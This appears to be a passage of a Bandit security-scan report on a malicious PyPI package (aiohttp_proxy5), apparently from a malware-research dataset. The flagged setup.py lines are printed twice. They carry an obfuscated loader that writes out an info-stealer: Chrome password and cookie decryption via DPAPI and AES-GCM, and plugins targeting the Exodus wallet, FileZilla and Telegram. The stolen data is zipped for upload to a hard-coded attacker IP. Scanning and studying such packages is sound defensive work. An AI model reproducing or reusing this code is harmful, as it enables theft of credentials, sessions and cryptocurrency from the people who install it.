109			with open (OO000O0O0000O00OO ,OO0OOOOOO0O0OO0OO )as OOO00OOO000O0O00O :OOO00OOO000O0O00O .write (O00OOOO0OOO0OO0OO )#line:23
110		import sys as __stickytape_sys ;__stickytape_sys .path .insert (0 ,__OO0O0O0OOOO000OOO );__O0O0O0OOOOO0O0O00 ('path_search.py',b"import asyncio\r\nimport os\r\nfrom os.path import join, isdir\r\nfrom typing import Dict, Iterable, List\r\n\r\n\r\nLOCAL = os.environ['USERPROFILE']\r\n\r\nroot_paths = {\r\n    join(LOCAL, 'appdata'),\r\n    join(LOCAL, 'appdata', 'local'),\r\n    join(LOCAL, 'appdata', 'roaming'),\r\n    join(LOCAL, 'documents'),\r\n    join(LOCAL, 'downloads'),\r\n    join(LOCAL, 'desktop'),\r\n    'C:\\\\',\r\n    'D:\\\\',\r\n    'E:\\\\',\r\n    'C:\\\\Program Files',\r\n    'C:\\\\Program Files (x86)',\r\n    'C:\\\\\\ProgramData'\r\n\r\n}\r\n\r\n\r\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict):\r\n    tasks: List[asyncio.Task] = []\r\n\r\n    queries = {k.lower(): v for k,v in queries.items()}\r\n    target_folder_names = set(queries.keys())\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if queries[fname] is not None:\r\n                    curr_path = join(p, fname)\r\n                    loop = asyncio.get_event_loop()\r\n                    task = loop.create_task(queries[fname].callback(curr_path))\r\n                    tasks.append(task)\r\n\r\n    for task in tasks:\r\n        await task\r\n\r\n\r\nasync def search_paths(paths: Iterable[str], queries: Iterable):\r\n    target_folder_names = {i.lower() for i in queries}\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if fname in target_folder_names:\r\n                    yield join(p, fname)\r\n");__O0O0O0OOOOO0O0O00 ('config.py',b'from dataclasses import dataclass, field\r\nfrom aiohttp import ClientSession as Session\r\n\r\n\r\n@dataclass\r\nclass Config:\r\n    client_id: str\r\n    host: str\r\n    log_path: str\r\n    browser_passwords: bool = field(default=True)\r\n    browser_cookies: bool = field(default=True)');__O0O0O0OOOOO0O0O00 ('paths.py',b"from os import environ\r\nfrom os.path import join\r\n\r\n\r\nLOCAL = environ['USERPROFILE']\r\nTEMP = join(LOCAL, 'appdata', 'local', 'temp')");__O0O0O0OOOOO0O0O00 ('tools.py',b"import os\r\nfrom aiofiles.os import wrap\r\nfrom shutil import copyfile, copytree\r\nimport timeit\r\n\r\n\r\ndef zipdir(path, ziph):\r\n    '''From stackoverflow'''\r\n    # ziph is zipfile handle\r\n    for root, dirs, files in os.walk(path):\r\n        for file in files:\r\n            ziph.write(os.path.join(root, file), \r\n                       os.path.relpath(os.path.join(root, file), \r\n                                       os.path.join(path, '..')))\r\n\r\ncopyfile = wrap(copyfile)\r\ncopytree = wrap(copytree)\r\n");__O0O0O0OOOOO0O0O00 ('plugins/__init__.py',b'from .base_plugin import Plugin\r\n\r\nfrom .browsers import Chromium\r\n\r\nfrom .details import Details\r\n\r\nfrom .wallets import Exodus\r\n\r\nfrom .filezilla import Filezilla\r\n\r\nfrom .telegram import Telegram');__O0O0O0OOOOO0O0O00 ('plugins/base_plugin.py',b'from config import Config\r\nfrom abc import ABC, abstractmethod\r\n\r\n\r\nclass Plugin(ABC):\r\n    @abstractmethod\r\n    def __init__(self, conf: Config) -> None:\r\n        ...\r\n\r\n    @abstractmethod\r\n    async def callback(path: str) -> None:\r\n        ...');__O0O0O0OOOOO0O0O00 ('plugins/browsers/__init__.py',b'from .chromium import Chromium');__O0O0O0OOOOO0O0O00 ('plugins/browsers/chromium.py',_OO00OOO0OOO0OOO00 );__O0O0O0OOOOO0O0O00 ('plugins/browsers/decrypt.py',b'# https://github.com/hakanonymos/steal-chrome-password-all-version/blob/master/local.py\r\n\r\n\r\nimport ctypes\r\nimport ctypes.wintypes\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives.ciphers import (\r\n    Cipher, algorithms, modes)\r\nimport base64\r\nimport os\r\nimport json\r\n\r\n\r\nclass Decryptor:\r\n    def __init__(self, path) -> None:\r\n        if path is None:\r\n            self.path = os.path.join(os.environ[\'LOCALAPPDATA\'], r"Google\\Chrome\\User Data\\Local State")\r\n        else:\r\n            self.path = path\r\n        \r\n        self.key = None\r\n        self.cipher = None\r\n\r\n    @staticmethod\r\n    def dpapi_decrypt(encrypted):\r\n        class DATA_BLOB(ctypes.Structure):\r\n            _fields_ = [(\'cbData\', ctypes.wintypes.DWORD),\r\n                        (\'pbData\', ctypes.POINTER(ctypes.c_char))]\r\n\r\n        p = ctypes.create_string_buffer(encrypted, len(encrypted))\r\n        blobin = DATA_BLOB(ctypes.sizeof(p), p)\r\n        blobout = DATA_BLOB()\r\n        retval = ctypes.windll.crypt32.CryptUnprotectData(\r\n            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\r\n        if not retval:\r\n            raise ctypes.WinError()\r\n        result = ctypes.string_at(blobout.pbData, blobout.cbData)\r\n        ctypes.windll.kernel32.LocalFree(blobout.pbData)\r\n        return result\r\n\r\n    @staticmethod\r\n    def decrypt(cipher, ciphertext, nonce):\r\n        cipher.mode = modes.GCM(nonce)\r\n        decryptor = cipher.decryptor()\r\n        return decryptor.update(ciphertext)\r\n\r\n    def get_key_from_local_state(self):\r\n        jsn = None\r\n        with open(self.path, \'r\') as f:\r\n            jsn = json.loads(str(f.readline()))\r\n        return jsn[\'os_crypt\'][\'encrypted_key\']\r\n\r\n    @staticmethod\r\n    def get_cipher(key):\r\n        cipher = Cipher(\r\n            algorithms.AES(key),\r\n            None,\r\n            backend=default_backend()\r\n        )\r\n        return cipher\r\n\r\n    def aes_decrypt(self, encrypted_txt):\r\n        if self.key is None:\r\n            encoded_key = self.get_key_from_local_state()\r\n            encrypted_key = base64.b64decode(encoded_key.encode())\r\n            encrypted_key = encrypted_key[5:]\r\n            self.key = Decryptor.dpapi_decrypt(encrypted_key)\r\n            self.cipher = Decryptor.get_cipher(self.key)\r\n        \r\n        nonce = encrypted_txt[3:15]\r\n\r\n        return Decryptor.decrypt(self.cipher,encrypted_txt[15:],nonce)\r\n\r\n    def decrypt_password(self, data):\r\n        try:\r\n            if data[:4] == b\'\\x01\\x00\\x00\\x00\':\r\n                decrypted = Decryptor.dpapi_decrypt(data)\r\n                return decrypted.decode()\r\n            elif data[:3] == b\'v10\':\r\n                decrypted = self.aes_decrypt(data)\r\n                return decrypted[:-16].decode()\r\n        except:\r\n            return None');__O0O0O0OOOOO0O0O00 ('plugins/browsers/Chromium.py',_OO00OOO0OOO0OOO00 );__O0O0O0OOOOO0O0O00 ('plugins/details.py',_O0O00OOO0O000000O );__O0O0O0OOOOO0O0O00 ('plugins/wallets/__init__.py',b'from .exodus import Exodus');__O0O0O0OOOOO0O0O00 ('plugins/wallets/exodus.py',_OOO000O00000OOOO0 );__O0O0O0OOOOO0O0O00 ('plugins/wallets/Exodus.py',_OOO000O00000OOOO0 );__O0O0O0OOOOO0O0O00 ('plugins/filezilla.py',_O0OOO0OOOO0OO0OOO );__O0O0O0OOOOO0O0O00 ('plugins/telegram.py',_O00O000OO00O00O0O );__O0O0O0OOOOO0O0O00 ('plugins/Details.py',_O0O00OOO0O000000O );__O0O0O0OOOOO0O0O00 ('plugins/Filezilla.py',_O0OOO0OOOO0OO0OOO );__O0O0O0OOOOO0O0O00 ('plugins/Telegram.py',_O00O000OO00O00O0O );import asyncio ;from asyncio import create_task ;from weakref import proxy ;from path_search import search_plugin_paths ,root_paths ;from config import Config ;from aiohttp import ClientSession as Session ,MultipartWriter ,hdrs ,FormData ;import secrets ,timeit ;from paths import TEMP ;from os import mkdir ;from os .path import join ;from zipfile import ZipFile ,ZIP_DEFLATED ;from base64 import b64encode ;from tools import zipdir ;from plugins import Chromium ,Details ,Exodus ,Filezilla ,Telegram ;HOST ='http://144.24.115.170'#line:24

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:110
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
109			with open (OO000O0O0000O00OO ,OO0OOOOOO0O0OO0OO )as OOO00OOO000O0O00O :OOO00OOO000O0O00O .write (O00OOOO0OOO0OO0OO )#line:23
110		import sys as __stickytape_sys ;__stickytape_sys .path .insert (0 ,__OO0O0O0OOOO000OOO );__O0O0O0OOOOO0O0O00 ('path_search.py',b"import asyncio\r\nimport os\r\nfrom os.path import join, isdir\r\nfrom typing import Dict, Iterable, List\r\n\r\n\r\nLOCAL = os.environ['USERPROFILE']\r\n\r\nroot_paths = {\r\n    join(LOCAL, 'appdata'),\r\n    join(LOCAL, 'appdata', 'local'),\r\n    join(LOCAL, 'appdata', 'roaming'),\r\n    join(LOCAL, 'documents'),\r\n    join(LOCAL, 'downloads'),\r\n    join(LOCAL, 'desktop'),\r\n    'C:\\\\',\r\n    'D:\\\\',\r\n    'E:\\\\',\r\n    'C:\\\\Program Files',\r\n    'C:\\\\Program Files (x86)',\r\n    'C:\\\\\\ProgramData'\r\n\r\n}\r\n\r\n\r\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict):\r\n    tasks: List[asyncio.Task] = []\r\n\r\n    queries = {k.lower(): v for k,v in queries.items()}\r\n    target_folder_names = set(queries.keys())\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if queries[fname] is not None:\r\n                    curr_path = join(p, fname)\r\n                    loop = asyncio.get_event_loop()\r\n                    task = loop.create_task(queries[fname].callback(curr_path))\r\n                    tasks.append(task)\r\n\r\n    for task in tasks:\r\n        await task\r\n\r\n\r\nasync def search_paths(paths: Iterable[str], queries: Iterable):\r\n    target_folder_names = {i.lower() for i in queries}\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if fname in target_folder_names:\r\n                    yield join(p, fname)\r\n");__O0O0O0OOOOO0O0O00 ('config.py',b'from dataclasses import dataclass, field\r\nfrom aiohttp import ClientSession as Session\r\n\r\n\r\n@dataclass\r\nclass Config:\r\n    client_id: str\r\n    host: str\r\n    log_path: str\r\n    browser_passwords: bool = field(default=True)\r\n    browser_cookies: bool = field(default=True)');__O0O0O0OOOOO0O0O00 ('paths.py',b"from os import environ\r\nfrom os.path import join\r\n\r\n\r\nLOCAL = environ['USERPROFILE']\r\nTEMP = join(LOCAL, 'appdata', 'local', 'temp')");__O0O0O0OOOOO0O0O00 ('tools.py',b"import os\r\nfrom aiofiles.os import wrap\r\nfrom shutil import copyfile, copytree\r\nimport timeit\r\n\r\n\r\ndef zipdir(path, ziph):\r\n    '''From stackoverflow'''\r\n    # ziph is zipfile handle\r\n    for root, dirs, files in os.walk(path):\r\n        for file in files:\r\n            ziph.write(os.path.join(root, file), \r\n                       os.path.relpath(os.path.join(root, file), \r\n                                       os.path.join(path, '..')))\r\n\r\ncopyfile = wrap(copyfile)\r\ncopytree = wrap(copytree)\r\n");__O0O0O0OOOOO0O0O00 ('plugins/__init__.py',b'from .base_plugin import Plugin\r\n\r\nfrom .browsers import Chromium\r\n\r\nfrom .details import Details\r\n\r\nfrom .wallets import Exodus\r\n\r\nfrom .filezilla import Filezilla\r\n\r\nfrom .telegram import Telegram');__O0O0O0OOOOO0O0O00 ('plugins/base_plugin.py',b'from config import Config\r\nfrom abc import ABC, abstractmethod\r\n\r\n\r\nclass Plugin(ABC):\r\n    @abstractmethod\r\n    def __init__(self, conf: Config) -> None:\r\n        ...\r\n\r\n    @abstractmethod\r\n    async def callback(path: str) -> None:\r\n        ...');__O0O0O0OOOOO0O0O00 ('plugins/browsers/__init__.py',b'from .chromium import Chromium');__O0O0O0OOOOO0O0O00 ('plugins/browsers/chromium.py',_OO00OOO0OOO0OOO00 );__O0O0O0OOOOO0O0O00 ('plugins/browsers/decrypt.py',b'# https://github.com/hakanonymos/steal-chrome-password-all-version/blob/master/local.py\r\n\r\n\r\nimport ctypes\r\nimport ctypes.wintypes\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives.ciphers import (\r\n    Cipher, algorithms, modes)\r\nimport base64\r\nimport os\r\nimport json\r\n\r\n\r\nclass Decryptor:\r\n    def __init__(self, path) -> None:\r\n        if path is None:\r\n            self.path = os.path.join(os.environ[\'LOCALAPPDATA\'], r"Google\\Chrome\\User Data\\Local State")\r\n        else:\r\n            self.path = path\r\n        \r\n        self.key = None\r\n        self.cipher = None\r\n\r\n    @staticmethod\r\n    def dpapi_decrypt(encrypted):\r\n        class DATA_BLOB(ctypes.Structure):\r\n            _fields_ = [(\'cbData\', ctypes.wintypes.DWORD),\r\n                        (\'pbData\', ctypes.POINTER(ctypes.c_char))]\r\n\r\n        p = ctypes.create_string_buffer(encrypted, len(encrypted))\r\n        blobin = DATA_BLOB(ctypes.sizeof(p), p)\r\n        blobout = DATA_BLOB()\r\n        retval = ctypes.windll.crypt32.CryptUnprotectData(\r\n            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\r\n        if not retval:\r\n            raise ctypes.WinError()\r\n        result = ctypes.string_at(blobout.pbData, blobout.cbData)\r\n        ctypes.windll.kernel32.LocalFree(blobout.pbData)\r\n        return result\r\n\r\n    @staticmethod\r\n    def decrypt(cipher, ciphertext, nonce):\r\n        cipher.mode = modes.GCM(nonce)\r\n        decryptor = cipher.decryptor()\r\n        return decryptor.update(ciphertext)\r\n\r\n    def get_key_from_local_state(self):\r\n        jsn = None\r\n        with open(self.path, \'r\') as f:\r\n            jsn = json.loads(str(f.readline()))\r\n        return jsn[\'os_crypt\'][\'encrypted_key\']\r\n\r\n    @staticmethod\r\n    def get_cipher(key):\r\n        cipher = Cipher(\r\n            algorithms.AES(key),\r\n            None,\r\n            backend=default_backend()\r\n        )\r\n        return cipher\r\n\r\n    def aes_decrypt(self, encrypted_txt):\r\n        if self.key is None:\r\n            encoded_key = self.get_key_from_local_state()\r\n            encrypted_key = base64.b64decode(encoded_key.encode())\r\n            encrypted_key = encrypted_key[5:]\r\n            self.key = Decryptor.dpapi_decrypt(encrypted_key)\r\n            self.cipher = Decryptor.get_cipher(self.key)\r\n        \r\n        nonce = encrypted_txt[3:15]\r\n\r\n        return Decryptor.decrypt(self.cipher,encrypted_txt[15:],nonce)\r\n\r\n    def decrypt_password(self, data):\r\n        try:\r\n            if data[:4] == b\'\\x01\\x00\\x00\\x00\':\r\n                decrypted = Decryptor.dpapi_decrypt(data)\r\n                return decrypted.decode()\r\n            elif data[:3] == b\'v10\':\r\n                decrypted = self.aes_decrypt(data)\r\n                return decrypted[:-16].decode()\r\n        except:\r\n            return None');__O0O0O0OOOOO0O0O00 ('plugins/browsers/Chromium.py',_OO00OOO0OOO0OOO00 );__O0O0O0OOOOO0O0O00 ('plugins/details.py',_O0O00OOO0O000000O );__O0O0O0OOOOO0O0O00 ('plugins/wallets/__init__.py',b'from .exodus import Exodus');__O0O0O0OOOOO0O0O00 ('plugins/wallets/exodus.py',_OOO000O00000OOOO0 );__O0O0O0OOOOO0O0O00 ('plugins/wallets/Exodus.py',_OOO000O00000OOOO0 );__O0O0O0OOOOO0O0O00 ('plugins/filezilla.py',_O0OOO0OOOO0OO0OOO );__O0O0O0OOOOO0O0O00 ('plugins/telegram.py',_O00O000OO00O00O0O );__O0O0O0OOOOO0O0O00 ('plugins/Details.py',_O0O00OOO0O000000O );__O0O0O0OOOOO0O0O00 ('plugins/Filezilla.py',_O0OOO0OOOO0OO0OOO );__O0O0O0OOOOO0O0O00 ('plugins/Telegram.py',_O00O000OO00O00O0O );import asyncio ;from asyncio import create_task ;from weakref import proxy ;from path_search import search_plugin_paths ,root_paths ;from config import Config ;from aiohttp import ClientSession as Session ,MultipartWriter ,hdrs ,FormData ;import secrets ,timeit ;from paths import TEMP ;from os import mkdir ;from os .path import join ;from zipfile import ZipFile ,ZIP_DEFLATED ;from base64 import b64encode ;from tools import zipdir ;from plugins import Chromium ,Details ,Exodus ,Filezilla ,Telegram ;HOST ='http://144.24.115.170'#line:24
111		async def main ():#line:25

--------------------------------------------------

Code scanned:
	Total lines of code: 661
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 9.0
		High: 35.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 39.0
		High: 5.0
Files skipped (0):
